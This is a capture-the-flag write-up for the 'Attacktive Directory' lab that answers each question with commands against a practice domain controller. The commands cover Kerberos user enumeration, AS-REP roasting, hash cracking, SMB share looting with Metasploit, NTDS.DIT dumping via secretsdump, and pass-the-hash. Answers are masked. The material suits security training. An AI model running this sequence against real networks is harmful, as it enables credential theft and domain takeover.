# Attacktive Directory

- Initiate the VPN connection and deploy the machine!

	  no answer needed

- Read and follow along with the above.

	  no answer needed

- What tool will allow us to enumerate port 139/445?

	- `enum4linux`

- What is the NetBIOS-Domain Name of the machine?

	- `THM-AD`

- What invalid TLD do people commonly use for their Active Directory Domain?

	- `.local`

- What command within Kerbrute will allow us to enumerate valid usernames?

	- `userenum`

- What notable account is discovered? (These should jump out at you)

	- `sudo echo <TARGET_IP> spookysec.local >> /etc/hosts`
	- `kerbrute userenum --dc spookysec.local -d spookysec.local User.txt`
	- `sv*******`

- What is the other notable account is discovered? (These should jump out at you)

	- `******`

- We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

	- `impacket-GetNPUsers spookysec.local/sv******** -no-pass`
	- `sv*******`

- Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

	- `kerberos * ****** ***** 32`

- What mode is the hash?

	- `182**`

- Now crack the hash with the modified password list provided, what is the user accounts password?

	- `hashcat -m 182** kerberos_hash Pass.txt --force`
	- `**************`

- Using utility can we map remote SMB shares?

	- `smbclient`

- Which option will list shares?

	- `-l`

- How many remote shares is the server listing?

	- `smbclient -L spookysec.local -U 'sv*******'`
	- `*`

- There is one particular share that we have access to that contains a text file. Which share is it?

	- `msfconsole`
	- `search admin/smb/download_file`
	- `use 0`
	- `show options`
	- `set RHOSTS spookysec.local`
	- `set RPATH backup_credentials.txt`
	- `set SMBDOMAIN spookysec.local`
	- `set SMBPASS **************`
	- `set SMBSHARE backup`
	- `set SMBUSER sv*******`
	- `exploit`
	- `backup`

- What is the content of the file?

	- `***********************************************************`

- Decoding the contents of the file, what is the full contents?

	- `echo ***************************************** | base64 -d`
	- `********************************`

- What method allowed us to dump NTDS.DIT?

	- `DRS****`

- What is the Administrators NTLM hash?

	- `impacket-secretsdump -just-dc ba**************************`
	- `******************************`

- What method of attack could allow us to authenticate as the user without the password?

	- `pass the hash`

- Using a tool called Evil-WinRM what option will allow us to use a hash?

	- `-h`

- svc-admin

	- `************************+`

- backup

	- `************************`

- Administrator

	- `*************************`
